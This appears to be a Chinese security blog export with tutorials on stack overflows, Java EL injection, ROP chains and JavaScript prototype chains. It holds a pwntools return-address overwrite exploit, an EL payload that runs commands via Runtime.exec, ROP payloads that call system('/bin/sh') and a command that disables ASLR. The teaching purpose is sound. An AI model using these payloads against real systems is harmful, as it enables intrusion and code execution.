<p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有：</p>
<ul>
<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
</ul>
<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
<p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p>
<p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp<span class="number">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>


<p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0804843B</span> success         proc near</span><br><span class="line">.text:<span class="number">0804843B</span>                 push    ebp</span><br><span class="line">.text:<span class="number">0804843</span>C                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804843</span>E                 sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">08048441</span>                 sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048444</span>                 push    offset s        ; <span class="string">&quot;You Hava already controlled it.&quot;</span></span><br><span class="line">.text:<span class="number">08048449</span>                 call    _puts</span><br><span class="line">.text:<span class="number">0804844</span>E                 add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08048451</span>                 nop</span><br><span class="line">.text:<span class="number">08048452</span>                 leave</span><br><span class="line">.text:<span class="number">08048453</span>                 retn</span><br><span class="line">.text:<span class="number">08048453</span> success         endp</span><br></pre></td></tr></table></figure>


<p>那么如果我们读取的字符串为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x14</span>*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;bbbb&#x27;</span>+success_addr</span><br></pre></td></tr></table></figure>


<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    <span class="number">0x0804843B</span>   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp<span class="number">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>


<p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">\x3b\x84\x04\x08</span><br></pre></td></tr></table></figure>


<p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span> p32(success_addr)</span><br><span class="line"><span class="comment"># 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


<p>执行一波代码，可以得到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example python <span class="built_in">exp</span>.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./stack_example&#x27;</span>: pid <span class="number">61936</span></span><br><span class="line">;\x84\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Process <span class="string">&#x27;./stack_example&#x27;</span> stopped with <span class="built_in">exit</span> code <span class="number">-11</span> (SIGSEGV) (pid <span class="number">61936</span>)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending in interactive</span><br></pre></td></tr></table></figure>


<p>可以看到我们确实已经执行 success 函数。</p>
<h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p>
<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p>
<ul>
<li>输入<ul>
<li>gets，直接读取一行，忽略’\x00’</li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>strcpy，字符串复制，遇到’\x00’停止</li>
<li>strcat，字符串拼接，遇到’\x00’停止</li>
<li>bcopy</li>
</ul>
</li>
</ul>
<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
<ul>
<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
<li>直接地址索引，就相当于直接给定了地址。</li>
</ul>
<p>一般来说，我们会有如下的覆盖需求</p>
<ul>
<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
</ul>
<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownjBQdLcvCeyPfIi8.png"></p>
<p>运行时程序的栈：<br>上面高地址处存放的是环境变量和main函数的信息<br>往下是主调函数的栈内存，包括临时变量和控制信息（控制信息包括返回地址和ebp等用来保存的寄存器的值）</p>
<p>调用约定：<br>每个函数调用的时候都会自己平衡自己的堆栈。</p>
<p>每个被调函数被调用的时候先push　ebp所以栈里面会有返回地址和ebp</p>
<h2 id="两个表"><a href="#两个表" class="headerlink" title="两个表"></a><strong>两个表</strong></h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownnbq1cslCgh27owZ.png"></p>
<ul>
<li>全局偏移表<code>（GOT：Global Offset Table）</code>存放外部的函数地址</li>
<li>程序链接表<code>（PLT：Procedure Link Table）</code>存放额外代码</li>
</ul>
<p>plt表：函数调用的时候先使用的。<strong>PLT表中的每一项的-数据内容都是对应的GOT表中一项的地址这个是固定不变的</strong>，<strong>PLT表中的数据是跳转到GOT表项的地址</strong>。  </p>
<p>got表：一个指向真正运行函数首地址的指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>函数</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">遇到空格(<span class="number">0x20</span>)停止读取</span><br><span class="line"></span><br><span class="line">read函数</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span>  <span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br><span class="line">读取数据遇到\n(<span class="number">0x0a</span>)结束，\x0a会读进去</span><br><span class="line">fd为<span class="number">0</span>从键盘读取</span><br><span class="line"></span><br><span class="line">gets函数</span><br><span class="line">gets(str);</span><br><span class="line">输入遇到\n(<span class="number">0x0a</span>)结束</span><br><span class="line">\x0a不会读进去</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>函数</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, i);</span><br><span class="line">输出直到\x00</span><br><span class="line"></span><br><span class="line">write函数</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> nbyte)</span>;</span><br><span class="line">fd为<span class="number">1</span>输出到显示器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>函数</span><br><span class="line"><span class="built_in">puts</span>(<span class="type">char</span> *)</span><br><span class="line">相当于<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s)</span><br><span class="line">输出字符串（遇到\x00结束）</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>函数</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br><span class="line">一直复制直到遇到\x00</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>函数</span><br><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span>;</span><br><span class="line">复制任意内容</span><br><span class="line"></span><br><span class="line"><span class="built_in">strncpy</span>函数</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest,<span class="type">char</span> *src,<span class="type">int</span> <span class="type">size_t</span> n)</span>;</span><br><span class="line">如果n&lt;src的长度，只是将src的前n个字符复制到dest的前n个字符，不自动添加<span class="string">&#x27;\0&#x27;</span>。如果src的长度小于n个字节，则以<span class="literal">NULL</span>填充dest直到复制完n个字节</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaEL表达式注入</title>
    <url>/Inject/JAVA%20EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>之前一直打算写一篇解析，拖了一久就开始写了。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownAvYBeWiOuR3talo.png"></p>
<span id="more"></span>

<h1 id="JAVA反射机制"><a href="#JAVA反射机制" class="headerlink" title="JAVA反射机制"></a><center>JAVA反射机制</center></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>JAVA反射机制是在运行状态中，<strong>对于任意一个类，都能够知道这个类的所有属性和方法</strong>；<strong>对于任意一个对象，都能够调用它的任意一个方法和属性</strong>；这种<code>动态获取的信息</code>以及<code>动态调用对象</code>的方法的功能称为<code>java语言的反射机制</code>。<br>要想解剖一个类,必须先要获取到该类的字节码文件对象。而解剖使用的就是Class类中的方法.所以先要获取到每一个字节码文件对应的Class类型的对象.</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdowngSvljhYbHELAnpt.png"></p>
<ul>
<li>Java中编译类型有两种：<ul>
<li><strong>静态编译</strong>：在编译时确定类型，绑定对象即通过。</li>
<li><strong>动态编译</strong>：运行时确定类型，绑定对象。动态编译最大限度地发挥了Java的灵活性，体现了多态的应用，可以减低类之间的耦合性。</li>
</ul>
</li>
<li>实现Java反射机制的类都位于<code>java.lang.reflect</code>包中：<ol>
<li>Class类：代表一个类</li>
<li>Field类：代表类的成员变量（类的属性）</li>
<li>Method类：代表类的方法</li>
<li>Constructor类：代表类的构造方法</li>
<li>Array类：提供了动态创建数组，以及访问数组的元素的静态方法</li>
</ol>
</li>
</ul>
<p><strong>一句话概括就是使用反射可以赋予jvm动态编译的能力，否则类的元数据信息只能用静态编译的方式实现，例如热加载，Tomcat的classloader等等都没法支持。</strong></p>
<p>而JAVA EL表达式的命令执行Payload正需要反射调用的方式来实现。</p>
<p>以上只是为了简单回顾一下反射，第一次知道反射的同学可能还是蒙蔽的，建议还是好好了解一下。</p>
<h1 id="EL表达式基础"><a href="#EL表达式基础" class="headerlink" title="EL表达式基础"></a><center>EL表达式基础</center></h1><p>EL表达式是为了转化为JSP代码的，简洁表达式形式，相比直接使用JSP，EL表达式拥有更好的可读性。</p>
<p>EL 表达式语法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;EL表达式&#125;</span><br></pre></td></tr></table></figure>


<p>EL 表达式语法以<code>$&#123;</code>开头，以<code>&#125;</code>结束，中间为合法的表达式。</p>
<h1 id="EL表达式注入原理解析"><a href="#EL表达式注入原理解析" class="headerlink" title="EL表达式注入原理解析"></a><center>EL表达式注入原理解析</center></h1><p><code>pagecontext</code>域可操纵<code>request</code> <code>session</code> <code>application</code>，而这几个域里面均有setAttribute方法</p>
<ul>
<li><p>Attribute方法</p>
<ul>
<li>这个方法作用就是<strong>保存数据</strong>，然后还可以用<code>getAttribute</code>方法来取出。</li>
</ul>
</li>
<li><p>反射中的Method类的invoke() 和getMethod()</p>
<ul>
<li>getMethod() → 获得对象所声明的公开方法  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">person.getClass().getMethod(<span class="string">&quot;Speak&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
  获得person对象的Speak方法，因为Speak方法没有形参，所以parameterTypes为null</li>
</ul>
</li>
<li><p>getRuntime()方法<br>  <code>java.lang.Runtime.getRuntime() </code>方法返回与当前Java应用程序相关的运行时对象。大多数Runtime类的方法是实例方法，必须相对于当前的运行时对象被调用。</p>
</li>
<li><p>invoke()方法</p>
<ul>
<li>执⾏函数的⽅法</li>
</ul>
</li>
<li><p>getInputStream方法</p>
<ul>
<li><code>getInputStream()方法</code>在java.lang包中可用。</li>
<li><code>getInputStream()方法</code>用于获取流程和子流程的输入流。</li>
<li><code>getInputStream()方法</code>是一个非静态方法，只能通过类对象访问，如果尝试使用类名称访问该方法，则会收到错误消息。</li>
<li>返回输入流时，<code>getInputStream()方法</code>不会引发异常。</li>
</ul>
</li>
</ul>
<p>pagecontext域控制request.getSession()调用其中的getAttribute，getAttribute方法取出任意值a，<code>pageContext.request.getClass().forName(&#39;java.lang.Runtime&#39;)</code>吧<code>java.lang.Runtime</code>反射出来，调用<code>java.lang.Runtime</code> 中的方法<code>getMethod（）</code> ，获得相应对象的getRuntime()方法,得到相关的Method对象，<code>invoke(null,null)</code> 反射得到exec()方法，getInputStream()方法简而言之就是可以有回显。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&#x27;a&#x27;</span>,pageContext.request.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)</span><br><span class="line">.getMethod(<span class="string">&#x27;getRuntime&#x27;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&#x27;calc&#x27;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
<p>实际为一行，换行只是为了更好看到。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>Inject</tag>
      </tags>
  </entry>
  <entry>
    <title>32位与64位ROP详解</title>
    <url>/PWN/32%E4%BD%8D%E4%B8%8E64%E4%BD%8DROP%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做pwn的前置知识，写EXP要用到。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown93016202_p0.jpg"></p>
<span id="more"></span>

<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h2><p>ROP的全称为<code>Return-oriented programming</code>（返回导向编程），也可以理解为面向返回地址的编程，这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过上一篇文章栈溢出，我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p>
<h2 id="为什么要ROP"><a href="#为什么要ROP" class="headerlink" title="为什么要ROP"></a><strong>为什么要ROP</strong></h2><p>探究原因之前，我们先看一下什么是NX(DEP) NX即No-execute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就有了各种绕过办法，rop就是一种</p>
<h1 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h1><p>32位程序的栈溢出，只有输入的字节填满栈空间，和返回地址，即可劫持栈帧，达到控制执行流的效果,</p>
<p>假设栈开辟了20字节的空间，rbp为8字节，由此可得payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p32(system_addr) + p32(bin_addr)</span><br></pre></td></tr></table></figure>




<h1 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h1><h3 id="寄存器传参"><a href="#寄存器传参" class="headerlink" title="寄存器传参"></a>寄存器传参</h3><p>64位和32位程序的不同点之一就是，它的前6个参数是通过寄存器传递的，有更多的参数才用栈，所以构造rop链的方式和32位不同。</p>
<p>分别是<code>rdi</code>，<code>rsi</code>，<code>rdx</code>，<code>rcx</code>，<code>r8</code>，<code>r9</code>作为第1-6个参数。rax作为返回值 64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，所以rbp作为通用寄存器使用。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownfMxenQwX7syu6Ri.png"></p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>构造rop,泄露出libc地址，调用system(“&#x2F;bin&#x2F;sh”)</p>
<h3 id="gadaget准备"><a href="#gadaget准备" class="headerlink" title="gadaget准备"></a>gadaget准备</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget –binary xxx –only “pop|ret”</span><br></pre></td></tr></table></figure>


<h1 id="泄露system地址和-x2F-bin-x2F-sh"><a href="#泄露system地址和-x2F-bin-x2F-sh" class="headerlink" title="泄露system地址和&#x2F;bin&#x2F;sh"></a>泄露system地址和&#x2F;bin&#x2F;sh</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>] - libc.symbols[<span class="string">&#x27;puts&#x27;</span>] + u64(puts_addr)</span><br><span class="line">sh_addr = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))- libc.symbols[<span class="string">&#x27;puts&#x27;</span>] + u64(puts_addr)</span><br></pre></td></tr></table></figure>


<h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>64位还要考虑堆栈平衡，由此可以有3种payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 泄露libc地址</span></span><br><span class="line">payload1=padding+p64(pop_rdi_ret) + p64(puts_got_addr) + p64(puts_plt_addr)</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一个payload利用ret来堆栈平衡</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x0f</span>+<span class="number">0x08</span>) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>




<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 寄存器调用顺序：rdi、rsi、rdx、rcx、r8、r9</span></span><br><span class="line"><span class="comment"># 先利用pop+ret将bin_sh_addr地址弹到rdi寄存器中去，再调用system函数来执行</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x0f</span>+<span class="number">0x08</span>) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>


<p>前两个payload利用64位程序函数调用参数规则构造</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// ret堆栈平衡，直接返回bin_sh_addr处也可以获得系统权限。</span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27; * (0x0f+0x08) + p64(ret_addr) + p64(bin_sh_addr)</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>原型链污染</title>
    <url>/JavaScript/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要一定的js基础</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownZHNuSfXCDk4OEab.jpg"></p>
<span id="more"></span>

<h1 id="prototype和-proto"><a href="#prototype和-proto" class="headerlink" title="prototype和__proto__"></a><code>prototype</code>和<code>__proto__</code></h1><p>又称<code>原型链污染</code>。</p>
<p>在JS语言中，函数即对象，如果要定义一个类，需要以<code>定义</code> 构造函数的方式来定义</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br></pre></td></tr></table></figure>


<p><strong>即是函数既可以作为对象去解释又可以作为函数去解释</strong></p>
<p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个寻找到具体方法或者属性的机制。</p>
<p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>


<p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p>
<p>如果希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>


<p>所以可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p>
<p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p>
<p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p>
<p><code>foo.``**proto**`` == Foo.prototype</code></p>
<p><img src="https://s2.loli.net/2022/03/15/YAlLm68IaD2PVHR.png"></p>
<p>所以，总结一下：</p>
<ol>
<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
</ol>
<h1 id="JavaScript原型链继承"><a href="#JavaScript原型链继承" class="headerlink" title="JavaScript原型链继承"></a>JavaScript原型链继承</h1><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
<p>比如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>


<p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p>
<p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p>
<ol>
<li>在对象son中寻找last_name</li>
<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
</ol>
<p><img src="https://s2.loli.net/2022/03/15/rv6q7AOwld9DJYV.png"></p>
<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作<code>prototype继承链</code>。</p>
